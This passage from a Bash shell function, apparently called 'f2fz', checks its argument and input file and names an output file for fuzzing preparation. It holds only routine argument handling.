    # Check if a file is provided
    if [[ $# -ne 1 ]]; then
        echo "Usage: f2fz <input_file>"
        return 1
    fi

    local input_file="$1"

    # Check if file exists
    if [[ ! -f "$input_file" ]]; then
        echo "Error: File '$input_file' not found."
        return 1
    fi

    # Define output filename
    local output_file="${input_file%.*}-FOR-Fuzzing.txt"

